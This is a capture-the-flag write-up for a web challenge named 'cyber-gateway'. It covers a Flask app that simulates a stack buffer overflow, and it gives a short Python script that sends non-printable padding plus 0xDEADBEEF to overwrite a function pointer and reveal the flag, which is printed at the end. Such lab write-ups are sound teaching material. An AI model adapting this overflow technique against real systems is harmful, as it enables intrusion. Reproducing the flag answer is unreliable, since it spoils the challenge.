# cyber-gateway

## Description
> Wait, Neo is now in Cyberpunk? Is there a Morpheus as well? And what will he be offering Neo? This world is very 0x41414141.

Tags: _web_

## Recon

I was given a Flask web application

Looking at the [app.py](./app.py) source code, I found two routes defined:

```python
SECRET_ROUTE = 0xDEADBEEF
CYBER_ROUTE  = 0x41414141

def secret_gateway_route():
    return f"Wake up {FLAG}"

def cyber_gateway_route():
    return f"You take the {hex(CYBER_ROUTE)} route, the story ends..."
```

The `SECRET_ROUTE` returns the flag, while the `CYBER_ROUTE` just returns a message.

The Vulnerable Code:

```python
stack_size = 32
fp_size = 4  
total_size = stack_size + fp_size

stack_memory = bytearray(total_size)

# Initialize function pointer to CYBER_ROUTE
stack_memory[stack_size : stack_size + fp_size] = CYBER_ROUTE.to_bytes(4, "little")

# Copy user input, potentially overwriting the function pointer!
for i, b in enumerate(user_data):
    if i < total_size:
        stack_memory[i] = b

# Execute the function based on the (potentially overwritten) pointer
fp = int.from_bytes(stack_memory[stack_size : stack_size + fp_size], "little")
if fp in function_map:
    result = function_map[fp]()
```

The application:
- Creates a 36-byte buffer (32 + 4)
- Sets the function pointer to `CYBER_ROUTE` (0x41414141)
- Copies user input into the buffer without bounds checking

Input Restrictions:

```python
if b"A" in user_data:
    abort(400, "Hacking detected")

for char in user_data:
    if chr(char) in printable:
        abort(400, "Invalid gateway request")
```

- 'A' (byte 0x41)
- printable ASCII characters

## Exploitation

To exploit this, I needed to:
- fill the stack (32 Bytes)
- follow with 0xDEADBEEF in little-endian

`0xDEADBEEF` in little-endian becomes:
```
0xEF 0xBE 0xAD 0xDE
```
(Least significant byte first)

I tried crafting this in Burp Suite, but ran into problems:
- `0xEF` = `ï` (can be typed)
- `0xBE` = `¾` (can be typed)
- `0xAD` and `0xDE` have no UTF-8 representation

Since I can't send these bytes through a browser, I used Python's `requests` library to send raw binary data:

```python
import requests

target = "http://172.26.0.2:1337/"

padding = bytes([0x80] * 32)
fp      = (0xDEADBEEF).to_bytes(4, 'little')
payload = padding + fp

r = requests.post(target, data=payload)
print(r.text)
```

This successfully overwrote the function pointer from `CYBER_ROUTE` to `SECRET_ROUTE`, causing the application to call `secret_gateway_route()` and return the flag

## Flag

`CLA{cyber_n3o_w0ke_up_489135_kCo3msMSdT0U}`
